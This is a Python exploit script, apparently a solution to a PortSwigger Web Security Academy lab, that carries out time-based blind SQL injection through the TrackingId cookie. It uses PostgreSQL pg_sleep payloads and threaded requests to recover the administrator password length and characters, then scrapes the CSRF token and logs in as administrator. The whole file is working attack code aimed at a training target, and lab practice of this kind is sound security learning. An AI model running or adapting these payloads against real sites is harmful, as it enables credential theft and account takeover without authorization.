import requests
import concurrent.futures
import re

# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0a280068030682a380fc62000099005a.web-security-academy.net/"  # application URL
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def password_length(i):
    cookies = {"TrackingId": "96'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)="+str(i)+")+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"}
    r = requests.get(app_url, verify=False, proxies=proxies, cookies=cookies)
    tim = r.elapsed.total_seconds()
    if tim > 4:
        return i
    return None

def find_pass_char(j, k):
    cookies = {"TrackingId": "96'%3bSELECT+CASE+WHEN+username='administrator'+AND+ascii(SUBSTRING(password," + str(j) + ",1))+=" + str(k) + "+THEN+PG_SLEEP(7)+ELSE+pg_sleep(0)+END+FROM+users--"}
    res = requests.get(app_url, verify=False, proxies=proxies, cookies=cookies)
    time = res.elapsed.total_seconds()
    if time > 7:
        return chr(k)
    return None

print("Let's find the length of the password of admin account")

length = None
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    future_to_i = {executor.submit(password_length, i): i for i in range(1, 30)}
    for future in concurrent.futures.as_completed(future_to_i):
        result = future.result()
        if result is not None:
            length = result
            break


print("password length is " + str(length))


print("Now let's find the admin password")

pass_a = [''] * length
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    for j in range(1, length+1):
        future_to_char = {executor.submit(find_pass_char, j, k): k for k in range(0, 127)}
        for future in concurrent.futures.as_completed(future_to_char):
            result = future.result()
            if result is not None:
                pass_a[j-1] = result
                print(f"{j} character of password are {result}")
                break

final_pass = ''.join(pass_a)
print("Final password is: " + final_pass)

print("Now lets login as admin, but firstly find csrf token")

admin_session = requests.session()
res= admin_session.get(app_url+"login",verify=False,proxies=proxies)
token_pattern = re.search(r'name="csrf" value="(.+?)"',res.text)  # way to find csrf token
ftoken = token_pattern.group(1)
print("CSRF token is", ftoken)


a_data = {'username':'administrator','password':final_pass,'csrf':ftoken}
a_res = admin_session.post(app_url+"login",verify=False,proxies=proxies,data=a_data)
print("session for admin is", admin_session.cookies.get_dict())
